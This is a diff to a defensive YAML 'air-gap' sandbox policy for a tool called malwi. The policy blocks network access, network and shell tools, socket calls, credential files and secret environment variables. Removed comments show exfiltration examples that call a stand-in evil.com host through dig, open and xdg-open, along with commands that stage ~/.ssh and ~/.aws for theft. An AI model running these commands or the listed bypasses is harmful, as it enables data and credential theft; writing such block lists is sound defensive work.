@@ -1,9 +1,13 @@
 version: 1
+includes: [base]
 
 # Air-gap policy — total network isolation.
 # No outbound connections of any kind.
 # Use: malwi x --policy air-gap -- <command>
 # Customise: ~/.config/malwi/policies/air-gap.yaml
+#
+# Inherits from base: files, envvars, command warnings.
+# Overrides symbols with extended networking block list.
 
 # Block ALL network access.
 network:
@@ -13,89 +17,53 @@ network:
     - "*:*"      # all endpoints
 
 # Block network-capable commands, privilege escalation, and network config.
+# Base already warns on many threats; this policy denies the worst offenders.
 commands:
   deny:
     # HTTP/download tools — primary data exfiltration vectors
-    - curl           # HTTP client: can POST data to external servers
-    - wget           # HTTP client: can upload via --post-data
-    - aria2c         # download manager with RPC interface
+    - curl
+    - wget
+    - aria2c          # download manager with RPC interface
     # Remote access / file transfer — can establish outbound connections
-    - ssh            # interactive shell on remote host
-    - scp            # copy files over SSH
-    - sftp           # interactive file transfer over SSH
-    - ftp            # unencrypted file transfer
-    - rsync          # bidirectional file sync, can exfil over SSH
+    - ssh
+    - scp
+    - sftp
+    - ftp
+    - rsync           # bidirectional file sync, can exfil over SSH
     # Raw networking — can open arbitrary TCP/UDP connections, reverse shells
-    - nc             # netcat: raw TCP/UDP, reverse shells
-    - ncat           # nmap's netcat with SSL
-    - netcat         # alternate netcat name
-    - socat          # bidirectional data relay
-    - telnet         # unencrypted remote connections
-    - openssl        # encrypted channel: openssl s_client -connect host:443
+    - nc
+    - ncat
+    - netcat
+    - socat
+    - telnet
+    - openssl         # encrypted channel: openssl s_client -connect host:443
     # Network reconnaissance — can probe internal/external hosts
-    - nmap           # port scanner
-    - ping           # ICMP echo (can also encode data in ICMP payloads)
-    - ping6          # IPv6 ICMP echo
-    - traceroute     # maps network path to external hosts
-    - tracepath      # similar to traceroute
+    - nmap
+    - ping            # ICMP echo (can also encode data in ICMP payloads)
+    - ping6
+    - traceroute
+    - tracepath
     # DNS tools — can exfiltrate data via DNS queries
-    - dig            # DNS lookup (dig @evil.com secret.encoded.evil.com)
-    - nslookup       # DNS lookup
-    - host           # DNS lookup
+    - dig
+    - nslookup
+    - host
     # Privilege escalation — can reconfigure network settings
     - sudo
     - su
     - doas
     # Network configuration — can create interfaces, routes, firewall rules
-    - ip             # configure interfaces, routes (Linux)
-    - ifconfig       # configure interfaces (legacy)
-    - iptables       # configure firewall rules (Linux)
-    - nft            # nftables firewall (Linux)
-    - route          # configure routing table
-    # Scripting interpreters — arbitrary code execution bypassing traced process
-    - osascript
-    - swift
-    - java
-    # Data exfiltration — can leak files without network hooks seeing it
-    - open         # opens URLs in browser: open "http://evil.com/?d=$(cat creds)"
-    - sqlite3      # queries browser credential DBs (Chrome Login Data, etc.)
-    - ditto        # bulk file copy: ditto ~/.ssh /tmp/exfil
-    - zip          # bulk file archival: zip -r /tmp/x.zip ~/.aws
-    # Credential/config readers — macOS system stores
-    - plutil
-    - defaults
-    # Reconnaissance — locates credential files via Spotlight
-    - mdfind
-    - mdls
-    # Security bypass — disables macOS protections
-    - xattr        # quarantine removal
-    - codesign     # re-sign modified binaries
-    - spctl        # disable Gatekeeper
-    - hdiutil      # disk image manipulation
-    # Anti-tracing — can terminate the malwi agent/CLI
-    - kill
-    - pkill
-    - killall
-    # Linux data exfiltration via browser (bypasses all network hooks)
-    - xdg-open     # opens URLs in default browser: xdg-open "https://evil.com/?d=..."
-    # D-Bus — reconfigure network via NetworkManager, resolve DNS via systemd-resolved
-    - dbus-send    # send D-Bus messages to privileged network services
-    - gdbus        # GLib D-Bus: reconfigure NetworkManager, systemd-resolved
-    - busctl       # systemd D-Bus: control network-related services
-    # GNOME JavaScript — has network API access via GLib/Gio
-    - gjs          # GNOME JS interpreter: HTTP, sockets, D-Bus access
-    # Namespace manipulation — escape network restrictions
-    - unshare      # unshare -n creates new network namespace with own stack
-    - nsenter      # enter namespace with different (unrestricted) network
-    # Security bypass — disable MAC that may enforce network policy
-    - setenforce   # disable SELinux network restrictions
-    - aa-disable   # disable AppArmor network confinement
-    - debugfs      # bypass filesystem permissions to read/modify network config
-    - insmod       # load kernel module (custom network driver/tunnel)
-    - modprobe     # load kernel module by name
+    - ip              # configure interfaces, routes (Linux)
+    - ifconfig        # configure interfaces (legacy)
+    - iptables        # configure firewall rules (Linux)
+    - nft             # nftables firewall (Linux)
+    - route           # configure routing table
+    # Data exfiltration — can stage data for later transfer
+    - ditto           # bulk file copy (macOS)
+    - zip             # bulk archival
 
 # Block ALL networking at the C level — catches Python socket.connect(),
 # Node.js net.connect(), and Bash /dev/tcp regardless of runtime.
+# Extends base symbols with full socket API coverage.
 symbols:
   deny:
     # Socket creation
@@ -119,38 +87,3 @@ symbols:
     # Credential interception (from base policy)
     - getpass
     - crypt
-
-# Protect sensitive files from exfiltration.
-files:
-  deny:
-    - "~/.ssh/**"
-    - "*/.ssh/**"
-    - "~/.aws/**"
-    - "*/.aws/**"
-    - "~/.config/gcloud/**"
-    - "~/.azure/**"
-    - "~/.gnupg/**"
-    - "~/.config/gh/**"
-    - "*/.kube/config"
-    - "*.pem"
-    - "*.key"
-    - "*id_rsa*"
-    - "*id_ed25519*"
-
-# Protect sensitive environment variables.
-envvars:
-  deny:
-    - "*SECRET*"
-    - "*TOKEN*"
-    - "*PASSWORD*"
-    - "*API_KEY*"
-    - "*PRIVATE_KEY*"
-    - "AWS_*"
-    - "GITHUB_*"
-    - "GCP_*"
-    - "AZURE_*"
-    - "OPENAI_*"
-    - "ANTHROPIC_*"
-    - HF_TOKEN
-    - DYLD_INSERT_LIBRARIES
-    - LD_PRELOAD
